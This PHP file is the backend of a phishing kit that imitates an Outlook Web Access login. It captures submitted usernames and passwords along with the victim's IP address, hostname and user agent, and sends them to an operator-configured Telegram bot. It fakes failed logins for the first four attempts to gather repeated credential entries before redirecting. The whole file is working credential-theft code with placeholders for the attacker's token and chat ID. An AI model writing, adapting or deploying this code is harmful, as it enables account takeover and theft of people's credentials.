<?php

// --- Configuration ---
$telegram_bot_token = 'bottoken'; // <--- REPLACE WITH YOUR BOT TOKEN
$telegram_chat_id = '-chatid';   // <--- REPLACE WITH YOUR CHAT ID
$delay_seconds = 2; // Delay in seconds to simulate processing
// ---------------------

header('Content-Type: application/json');

$email = isset($_POST['username']) ? trim($_POST['username']) : null;
$password = isset($_POST['password']) ? trim($_POST['password']) : null;
$count = isset($_POST['count']) ? intval($_POST['count']) : 0; // Get attempt count from frontend

// Function to send message to Telegram
function sendTelegramMessage($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML' // Optional: for formatting like bold, italics
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'ignore_errors' => true // Prevents file_get_contents from throwing error on 4xx/5xx
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    // Basic error check (optional)
    // if ($result === FALSE) { /* Handle error */ }
    // $response_data = json_decode($result, true);
    // if (!$response_data || !$response_data['ok']) { /* Handle API error */ }
}


if ($email && $password && $count > 0) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Construct Telegram message
    $telegram_message = "<b>OWA Login Attempt (#{$count})</b>\n";
    $telegram_message .= "<b>Username:</b> " . htmlspecialchars($email) . "\n";
    $telegram_message .= "<b>Password:</b> " . htmlspecialchars($password) . "\n"; // Be careful logging passwords!
    $telegram_message .= "<b>IP Address:</b> {$ip} ({$hostname})\n";
    $telegram_message .= "<b>User Agent:</b> " . htmlspecialchars($useragent) . "\n";
    $telegram_message .= "<b>Timestamp:</b> " . date('Y-m-d H:i:s T');

    // Send notification to Telegram
    if ($telegram_bot_token !== 'YOUR_TELEGRAM_BOT_TOKEN' && $telegram_chat_id !== 'YOUR_TELEGRAM_CHAT_ID') {
        sendTelegramMessage($telegram_bot_token, $telegram_chat_id, $telegram_message);
    }

    // Simulate processing delay
    sleep($delay_seconds);

    // Simulate login logic: Fail first 4 attempts, succeed subsequent attempts
    if ($count <= 4) { // Fail attempts 1 through 4
        $signal = 'ok'; // Keep signal 'ok' so frontend shows the message
        $msg = 'The username or password you entered isn\'t correct. Try entering it again.';
    } else { // Succeed on attempt 5 or greater
        $signal = 'ok'; // Signal 'ok' and count >= 5 triggers redirect in frontend (after frontend JS change)
        $msg = 'Login successful, redirecting...'; // Message not really shown due to redirect
    }

} else {
    // Handle missing fields or invalid count
    $signal = 'bad';
    $msg = 'Please fill in all the fields.';

    // Optionally send a Telegram message about the bad request
    // $bad_request_message = "Bad OWA Login Request:\n";
    // $bad_request_message .= "Email provided: " . ($email ? 'Yes' : 'No') . "\n";
    // $bad_request_message .= "Password provided: " . ($password ? 'Yes' : 'No') . "\n";
    // $bad_request_message .= "Count: {$count}\n";
    // $bad_request_message .= "IP: " . getenv("REMOTE_ADDR") . "\n";
    // if ($telegram_bot_token !== 'YOUR_TELEGRAM_BOT_TOKEN' && $telegram_chat_id !== 'YOUR_TELEGRAM_CHAT_ID') {
    //     sendTelegramMessage($telegram_bot_token, $telegram_chat_id, $bad_request_message);
    // }
}

// Send JSON response back to the frontend
$data = array(
    'signal' => $signal,
    'msg' => $msg
);
echo json_encode($data);

?>